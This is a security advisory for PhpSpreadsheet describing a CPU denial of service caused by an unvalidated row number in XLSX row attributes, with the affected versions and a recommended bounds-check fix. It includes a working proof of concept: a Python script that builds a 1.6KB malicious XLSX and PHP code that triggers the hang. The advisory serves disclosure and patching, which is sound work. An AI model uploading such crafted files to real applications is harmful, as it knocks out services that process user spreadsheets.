# [H] PhpSpreadsheet has CPU Denial of Service via Unbounded Row Number in XLSX Row Dimensions

## Summary
Severity: High
Advisory: GHSA-7c6m-4442-2x6m
CVE: CVE-2026-40902
CWE: CWE-400, CWE-770
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-7c6m-4442-2x6m
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=4.0.0 <5.7.0
- Packagist: `phpoffice/phpspreadsheet` — affected >=3.3.0 <3.10.5
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.4.5
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.16
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.30.4

## Details
## Summary

The XLSX reader's `ColumnAndRowAttributes::readRowAttributes()` method reads row numbers from XML attributes without validating them against the spreadsheet maximum row limit (`AddressRange::MAX_ROW = 1,048,576`). An attacker can craft a minimal XLSX file (~1.6KB) containing a `<row r="999999999"/>` element that inflates `cachedHighestRow` to 999,999,999, causing any subsequent row iteration to attempt ~1 billion loop cycles and exhaust CPU resources.

## Details

In `src/PhpSpreadsheet/Reader/Xlsx/ColumnAndRowAttributes.php` at line 216, the row index is cast directly from XML without bounds checking:

```php
// ColumnAndRowAttributes.php:216
$rowIndex = (int) $row['r'];  // No validation against AddressRange::MAX_ROW
```

This value flows through `setRowAttributes()` (line 126) → `$this->worksheet->getRowDimension($rowNumber)` (line 60), which updates the cached highest row in `Worksheet.php:1348`:

```php
// Worksheet.php:1342-1349
public function getRowDimension(int $row): RowDimension
{
    if (!isset($this->rowDimensions[$row])) {
        $this->rowDimensions[$row] = new RowDimension($row);
        $this->cachedHighestRow = max($this->cachedHighestRow, $row);
    }
    return $this->rowDimensions[$row];
}
```

The inflated `cachedHighestRow` is then returned by `getHighestRow()` (line 1099) and used as the default end bound in `RowIterator::resetEnd()` (RowIterator.php:86):

```php
// RowIterator.php:86
$this->endRow = $endRow ?: $this->subject->getHighestRow();
```

Notably, column attributes already have equivalent validation at line 161 (`AddressRange::MAX_COLUMN_INT`), and cell coordinates are validated in `Coordinate::coordinateFromString()` (line 40) against `MAX_ROW`. The row dimension attribute path bypasses both of these checks.

## PoC

**Step 1: Create the malicious XLSX file (~1.6KB)**

```python
import zipfile
import io

content_types = '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/></Types>'

rels = '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>'

workbook = '<?xml version="1.0" encoding="UTF-8"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'

wb_rels = '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/></Relationships>'

sheet = '<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1"><v>1</v></c></row><row r="999999999" ht="15"/></sheetData></worksheet>'

with zipfile.ZipFile('dos_row.xlsx', 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('[Content_Types].xml', content_types)
    zf.writestr('_rels/.rels', rels)
    zf.writestr('xl/workbook.xml', workbook)
    zf.writestr('xl/_rels/workbook.xml.rels', wb_rels)
    zf.writestr('xl/worksheets/sheet1.xml', sheet)

print("Created dos_row.xlsx")
```

**Step 2: Load with PhpSpreadsheet (CPU exhaustion)**

```php
<?php
require 'vendor/autoload.php';

use PhpOffice\PhpSpreadsheet\IOFactory;

$reader = IOFactory::createReader('Xlsx');
$spreadsheet = $reader->load('dos_row.xlsx');
$sheet = $spreadsheet->getActiveSheet();

echo "Highest row: " . $sheet->getHighestRow() . "\n";
// Output: Highest row: 999999999

// This will consume CPU for ~144 seconds (999M iterations)
foreach ($sheet->getRowIterator() as $row) {
    // CPU exhaustion
}
```

**Expected output:** `getHighestRow()` returns 999999999. Any row iteration hangs indefinitely.

## Impact

- **CPU Denial of Service:** A 1.6KB crafted XLSX file causes ~999 million loop iterations in any application that iterates rows using `getRowIterator()` or uses `getHighestRow()` as a loop bound. Estimated CPU burn is ~144 seconds per file.
- **Memory Exhaustion:** Applications that accumulate data during iteration (e.g., importing rows into a database, building arrays) will also exhaust memory.
- **Amplification:** The ratio of input size to resource consumption is extreme — 1,580 bytes triggers nearly 1 billion iterations.
- **Common Attack Surface:** PhpSpreadsheet is widely used in web applications that accept user-uploaded spreadsheets for import/processing, making this easily exploitable remotely.

## Recommended Fix

Add row bounds validation in `readRowAttributes()` at line 216, matching the column validation pattern already present at line 161:

```php
// src/PhpSpreadsheet/Reader/Xlsx/ColumnAndRowAttributes.php:216
// Before:
$rowIndex = (int) $row['r'];

// After:
$rowIndex = (int) $row['r'];
if ($rowIndex < 1 || $rowIndex > AddressRange::MAX_ROW) {
    continue;
}
```

The `AddressRange` import is already present at line 5 of this file. This fix is consistent with the existing cell coordinate validation in `Coordinate::coordinateFromString()` and the column validation at line 161.

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7c6m-4442-2x6m
- https://nvd.nist.gov/vuln/detail/CVE-2026-40902
- https://github.com/PHPOffice/PhpSpreadsheet
